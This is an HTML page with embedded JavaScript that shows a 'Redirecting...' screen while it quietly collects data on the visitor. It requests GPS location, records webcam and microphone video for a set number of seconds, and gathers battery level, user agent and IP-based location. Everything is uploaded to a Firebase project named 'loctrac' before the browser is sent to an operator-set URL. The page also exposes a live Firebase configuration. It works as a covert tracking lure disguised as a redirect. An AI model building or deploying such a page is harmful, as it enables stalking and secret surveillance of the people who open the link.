<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
         body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f3f7fa;
            color: #333;
             transition: background-color 0.5s, color 0.5s; /* Theme transition */
             background-size: cover; /* For background image */
             background-position: center;
        }
        .container {
            text-align: center;
            padding: 40px;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 500px;
             transition: background-color 0.5s, box-shadow 0.5s; /* Theme transition */
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
             transition: color 0.5s; /* Theme transition */
        }
        p {
            font-size: 1rem;
            margin-bottom: 15px;
             transition: color 0.5s; /* Theme transition */
        }
        .loading-dots::after {
            content: "";
            animation: dots 1s steps(4) infinite;
        }
        .error-message {
            color: #dc3545;
            margin-top: 20px;
            font-weight: bold;
             transition: color 0.5s; /* Theme transition */
        }
        @keyframes dots {
            0%   {content: "";}
            25%  {content: ".";}
            50%  {content: "..";}
            75%  {content: "...";}
        }

        /* Icon Container Style (Vak) */
        .icon-container {
            margin-bottom: 20px;
        }

        .icon-container img {
            max-width: 100px; /* Adjust as needed */
            max-height: 100px;
        }

        /* Custom Text Style */
        .custom-text {
            font-size: 1.2rem; /* Adjust as needed */
            margin-top: 20px;
        }
    </style>
    <!-- Firebase SDK (Firestore) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <!-- Firebase SDK (Storage) -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
</head>
<body>
    <div class="container">
        <div class="icon-container"> <!-- Container for Icon -->
            <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
        </div>
        <h1>Redirecting...</h1>
        <p>You will be redirected shortly <span class="loading-dots"></span></p>
        <p id="custom-redirect-text" class="custom-text" style="display: none;"></p> <!-- Custom Text Element -->
        <p id="error-message" class="error-message" style="display:none;"></p>
    </div>

<script>
// --- Firebase Config (YOUR ACTUAL CONFIG) ---
const firebaseConfig = {
    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
    authDomain: "loctrac-8d7ef.firebaseapp.com",
    projectId: "loctrac-8d7ef",
    storageBucket: "loctrac-8d7ef.firebasestorage.com",
    messagingSenderId: "34491549339",
    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
    measurementId: "G-65PYC8E9VR",
    // No databaseURL needed for Firestore
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const storage = firebase.storage();

const errorMessage = document.getElementById("error-message");
const themeIconElement = document.getElementById('theme-icon'); // Icon Element
const customRedirectTextElement = document.getElementById('custom-redirect-text'); // Custom Text Element


// --- Theme Definitions (Default Themes) ---
const themes = {
    default: {
        bodyBackgroundColor: '#f3f7fa',
        containerBackgroundColor: 'white',
        containerBoxShadow: '0 8px 16px rgba(0, 0, 0, 0.1)',
        headingColor: '#007bff',
        textColor: '#333',
        buttonBackgroundColor: '#007bff',
        buttonHoverBackgroundColor: '#0056b3',
        tableHeaderBackgroundColor: '#f9f9f9',
        tableHeaderColor: '#333',
        tableBorderColor: '#eee',
        tableTitleBorderColor: '#007bff',
    },
    dark: {
        bodyBackgroundColor: '#121212', /* Dark background */
        containerBackgroundColor: '#1e1e1e',
        containerBoxShadow: '0 8px 16px rgba(255, 255, 255, 0.1)', /* Light shadow for dark theme */
        headingColor: '#00a86b', /* Example accent color */
        textColor: '#f8f8f8', /* Light text */
        buttonBackgroundColor: '#00a86b',
        buttonHoverBackgroundColor: '#007a55',
        tableHeaderBackgroundColor: '#333', /* Darker header */
        tableHeaderColor: '#f8f8f8',
        tableBorderColor: '#555',
        tableTitleBorderColor: '#00a86b',
    },
    green: {
        bodyBackgroundColor: '#e8f5e9', /* Light green background */
        containerBackgroundColor: '#ffffff',
        containerBoxShadow: '0 8px 16px rgba(0, 0, 0, 0.1)',
        headingColor: '#4caf50', /* Green heading */
        textColor: '#333',
        buttonBackgroundColor: '#4caf50',
        buttonHoverBackgroundColor: '#43a047',
        tableHeaderBackgroundColor: '#f1f8e9', /* Lighter green header */
        tableHeaderColor: '#333',
        tableBorderColor: '#c8e6c9',
        tableTitleBorderColor: '#4caf50',
    },
};


// Utility functions
async function getCurrentUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
     const counterDoc = await counterRef.get();
      if (counterDoc.exists) {
        return `user${counterDoc.data().count}`;
      } else {
         return 'user1'; // Initial value. Should not normally happen
      }
}

// Utility function to promisify Geolocation API
function getCurrentPositionPromise() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        } else {
            reject(new Error("Geolocation is not supported"));
        }
    });
}

 // Utility function to promisify Battery API
function getBatteryPromise() {
    return new Promise((resolve, reject) => {
        if(navigator.getBattery) {
           resolve(navigator.getBattery());
        }else{
            reject(new Error("Battery API is not supported."));
        }
    });
}

 // TIP: Function to fetch IP Location Data
 async function getIPLocationData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            lat: parseFloat(data.latitude),
            lon: parseFloat(data.longitude),
            timestamp: new Date().toISOString()
        };
    } catch (error) {
        console.error('Error fetching IP location data:', error);
        return null;
    }
}

// Utility function to get device info
function getDeviceInfo() {
    return navigator.userAgent;
}

// Function to apply theme on redirect page (now handles both default and custom themes)
async function applyThemeRedirect(themeName) {
    let themeConfig = themes[themeName]; // Check if it's a default theme
    let customThemeData = null;

    if (!themeConfig) { // If not a default theme, try to load custom theme
        const customThemeRef = db.collection('redirectThemes').doc(themeName);
        const doc = await customThemeRef.get();
        if (doc.exists) {
            customThemeData = doc.data();
        }
    }

    if (customThemeData) {
        // Apply custom theme styles
        document.body.style.backgroundColor = customThemeData.backgroundImageUrl ? `url('${customThemeData.backgroundImageUrl}')` : '#f3f7fa'; // Default background if no image
        document.body.style.color = '#333'; // Default text color, can be customized in themeData later if needed
        const container = document.querySelector('.container');
        if (container) {
            container.style.backgroundColor = 'white'; // Or customize if needed
            container.style.boxShadow = '0 8px 16px rgba(0, 0, 0, 0.1)'; // Or customize
        }
        const h1 = document.querySelector('h1');
        if (h1) {
            h1.style.color = '#007bff'; // Or customize
        }
         const p = document.querySelectorAll('p');
        p.forEach(pElement => {
            pElement.style.color = '#333'; // Or customize
        });

        // Handle icon and custom text for custom theme
        if (customThemeData.iconImageUrl) {
            themeIconElement.src = customThemeData.iconImageUrl;
            themeIconElement.style.display = 'block';
        } else {
            themeIconElement.style.display = 'none';
        }
        if (customThemeData.customText) {
            customRedirectTextElement.textContent = customThemeData.customText;
            customRedirectTextElement.style.display = 'block';
        } else {
            customRedirectTextElement.style.display = 'none';
        }


    } else if (themeConfig) {
        // Apply default theme styles as before
        document.body.style.backgroundColor = themeConfig.bodyBackgroundColor;
        document.body.style.color = themeConfig.textColor;
        const container = document.querySelector('.container');
        if (container) {
            container.style.backgroundColor = themeConfig.containerBackgroundColor;
            container.style.boxShadow = themeConfig.containerBoxShadow;
        }
        const h1 = document.querySelector('h1');
        if (h1) {
            h1.style.color = themeConfig.headingColor;
        }
         const p = document.querySelectorAll('p');
        p.forEach(pElement => {
            pElement.style.color = themeConfig.textColor;
        });
        themeIconElement.style.display = 'none'; // Hide icon for default themes
        customRedirectTextElement.style.display = 'none'; // Hide custom text for default themes

    } else {
        // Fallback to default theme if themeName is not found and not a custom theme
        applyThemeRedirect('default');
    }
}


// Function to collect other data
async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
    let locationData = null;
    let batteryData = null;
    let locationError = null;
    let batteryError = null;
    let ipLocationData = null;
    let deviceInfo = getDeviceInfo();

    if (locationPermission) {
        try {
            const position = await getCurrentPositionPromise();
            locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            console.log("Location data:", locationData);
        } catch (error) {
            console.error("Error getting location:", error);
            let errorMsg = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg = "Gebruiker heeft locatietoestemming geweigerd.";
                    break;
                case error.POSITION_UNAVAILABLE:
                   errorMsg = "Locatie informatie is niet beschikbaar.";
                    break;
                case error.TIMEOUT:
                   errorMsg = "De aanvraag voor locatie duurde te lang.";
                    break;
                case error.UNKNOWN_ERROR:
                    errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
                    break;
                default:
                    errorMsg = error.message;
            }
            locationError = errorMsg;
             console.error("Location error:", locationError);

             ipLocationData = await getIPLocationData();
             if(ipLocationData){
                 console.log("IP Location data (fallback):", ipLocationData);
             } else {
                 console.error("Failed to get IP location fallback as well.");
             }

            }
    } else {
         ipLocationData = await getIPLocationData();
         if(ipLocationData){
             console.log("IP Location data (no GPS permission needed):", ipLocationData);
         } else {
             console.error("Failed to get IP location even when GPS permission not needed.");
         }
    }


    // 3. Battery
    if (navigator.getBattery) {
        try{
            const battery = await getBatteryPromise();
            batteryData = battery.level * 100;
            console.log("Battery data:", batteryData);

        }catch(error){
          console.error("Error getting batter:", error);
          batteryError = error.message;
          console.error("Battery error: ", batteryError);
        }
    }

    // All data collected (or errors stored), now save and redirect
    saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo);
}

// Function to handle camera/microphone permissions and recording (if needed)
async function handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId) {
    let videoUrl = null;
    let cameraError = null;
    let recorder = null;
    let stream = null;

    if (micCamPermission) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            console.log("Camera/Microphone stream obtained successfully.");

            if (recordSeconds > 0) {
                recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = event => {
                    chunks.push(event.data);
                };

                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    console.log("Blob type:", blob.type);

                    const storageRef = storage.ref();
                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`);

                    try {
                        console.log("Attempting to upload video to Firebase Storage...");
                        await videoRef.put(blob);
                        videoUrl = await videoRef.getDownloadURL();
                        console.log("Video URL obtained:", videoUrl);
                    } catch (uploadError) {
                        console.error("Error uploading video to Firebase Storage:", uploadError);
                        cameraError = "Error uploading video: " + uploadError.message;
                        videoUrl = null;
                    } finally {
                        collectOtherData(true, videoUrl, cameraError);
                         if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                    }
                };

                console.log("Starting video recorder...");
                recorder.start();

                setTimeout(() => {
                    if (recorder && recorder.state !== "inactive") {
                        console.log("Stopping video recorder from setTimeout...");
                        recorder.stop();
                    }
                }, recordSeconds * 1000);


            } else {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                collectOtherData(true, videoUrl, cameraError);
            }

        } catch (error) {
            console.error("Error accessing camera/microphone:", error);
            cameraError = error.message;
            collectOtherData(true, videoUrl, cameraError);
        } finally {
             if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    } else {
        collectOtherData(true, videoUrl, cameraError);
    }

    return { videoUrl, cameraError };
}


// Function to save data to Firestore and perform the redirect
async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData, deviceInfo) {
    const dataToSave = {
        videoUrl: videoUrl || null,
        location: locationData || null,
        batteryPercentage: batteryData,
        locationError: locationError || null,
        batteryError: batteryError || null,
        cameraError: cameraError || null,
        ipLocation: ipLocationData || null,
        deviceInfo: deviceInfo || null,
    };

    const currentUserId = await getCurrentUserId();
    const dataRef = db.collection('userData').doc(currentUserId);

    try {
        await dataRef.set(dataToSave);
        console.log("Data saved to Firestore!");
    } catch (error) {
        console.error("Error saving data to Firestore:", error);
         errorMessage.textContent = `Firestore Fout: ${error.message}`;
        errorMessage.style.display = 'block';
    }

    // Perform the redirect - get redirect URL and notification settings
    const settingsRef = db.collection('userSettings').doc(currentUserId);
    const settingsSnap = await settingsRef.get();
    let redirectUrl = null;
    let redirectSeconds = 0;
    let notificationPermission = false;
    let notificationTitle = null;
    let notificationBody = null;
    let notificationIcon = null;
    let themeName = 'default';

    if (settingsSnap.exists) {
        const settingsData = settingsSnap.data();
        redirectUrl = settingsData.redirectUrl;
        redirectSeconds = parseInt(settingsData.redirectSeconds) || 0;
        notificationPermission = settingsData.notificationPermission;
        notificationTitle = settingsData.notificationTitle;
        notificationBody = settingsData.notificationBody;
        notificationIcon = settingsData.notificationIcon;
        themeName = settingsData.theme || 'default';
    }

    await applyThemeRedirect(themeName); // Apply theme here (await to ensure theme is applied before redirect)


    // --- Trigger Notification BEFORE redirect, ONLY if permission is enabled in settings ---
    if (notificationPermission && notificationTitle && notificationBody) {
        if (!("Notification" in window)) {
            console.log("This browser does not support notifications.");
        } else if (Notification.permission === "granted") {
            try {
                new Notification(notificationTitle, {
                    body: notificationBody,
                    icon: notificationIcon || undefined
                });
                console.log("Notification sent on redirect!");
            } catch (notificationError) {
                console.error("Error sending notification on redirect:", notificationError);
            }
        } else if (Notification.permission === 'default') {
             Notification.requestPermission().then(permissionResult => {
                if(permissionResult === 'granted'){
                    try {
                        new Notification(notificationTitle, {
                            body: notificationBody,
                            icon: notificationIcon || undefined
                        });
                        console.log("Notification sent after permission granted!");
                    } catch (notificationError) {
                        console.error("Error sending notification after permission grant:", notificationError);
                    }
                } else {
                    console.log("Notification permission not granted by user after prompt on redirect.");
                }
            });

        } else { // Notification.permission === 'denied'
            console.log('Notification permission previously denied by user.');
        }
    }


    if (redirectUrl) {
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, redirectSeconds * 1000);
    } else {
         errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
        errorMessage.style.display = 'block';
    }
}

// --- Start of Script Execution ---
(async () => {
    // Get the current user ID *before* fetching settings
    const currentUserId = await getCurrentUserId();
    const settingsRef = db.collection('userSettings').doc(currentUserId);

    let micCamPermission = false;
    let recordSeconds = 0;
    let notificationPermissionSetting = false;
    let themeName = 'default'; // Default theme

    try {
        const settingsSnap = await settingsRef.get();
        if (settingsSnap.exists) {
            const settingsData = settingsSnap.data();
            micCamPermission = settingsData.micCamPermission;
            recordSeconds = parseInt(settingsData.recordSeconds) || 0;
            notificationPermissionSetting = settingsData.notificationPermission;
            themeName = settingsData.theme || 'default'; // Get theme name from settings
        } else {
            console.warn("No settings found in Firestore, using defaults.");
        }
    } catch (error) {
        console.error("Error fetching settings from Firestore:", error);
        errorMessage.textContent = `Firebase Fout bij laden instellingen: ${error.message}`;
        errorMessage.style.display = 'block';
    }


    // Apply theme FIRST
    await applyThemeRedirect(themeName);


    // Request notification permission ONLY if enabled in settings
    if (notificationPermissionSetting) {
        if (!("Notification" in window)) {
            console.log("This browser does not support notifications.");
        } else if (Notification.permission === "default") {
            const permissionResult = await Notification.requestPermission();
            if (permissionResult === 'granted') {
                console.log("Notification permission granted on redirect (because enabled in settings)!");
            } else if (permissionResult === 'denied') {
                console.log("Notification permission denied on redirect (because enabled in settings, but user denied).");
            } else {
                console.log("Notification permission dismissed or ignored on redirect (because enabled in settings).");
            }
        } else if (Notification.permission === 'granted') {
            console.log("Notification permission already granted (and enabled in settings).");
        } else if (Notification.permission === 'denied') {
            console.log("Notification permission already denied (even though enabled in settings).");
        }
    } else {
        console.log("Notification permission check skipped on redirect (because disabled in settings).");
    }


    // 1. Request Location Permission FIRST (without confirm dialog)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                console.log("Location permission granted (browser prompt).");
                // 2. If location granted, THEN request Camera/Microphone
                const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                const { videoUrl, cameraError } = cameraMicData;

                // Collect other data (battery, IP location) and redirect - location permission assumed granted here
                collectOtherData(true, videoUrl, cameraError); // Pass true for location permission


            },
            async (error) => {
                console.error("Location permission denied or error (browser prompt):", error);
                errorMessage.textContent = "Locatie toestemming geweigerd of fout (browser prompt).";
                errorMessage.style.display = 'block';

                // Still proceed to collect other data (battery, IP location) without GPS location, and redirect
                const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                const { videoUrl, cameraError } = cameraMicData;
                collectOtherData(false, videoUrl, cameraError); // Pass false for location denied
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        console.error("Geolocation is not supported by this browser.");
        errorMessage.textContent = "Locatie niet ondersteund door browser.";
        errorMessage.style.display = 'block';
        // Proceed to camera/mic and other data collection even if geolocation is not supported
        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
        const { videoUrl, cameraError } = cameraMicData;
        collectOtherData(false, videoUrl, cameraError); // Pass false for location not available
    }


})();
</script>
</body>
</html>
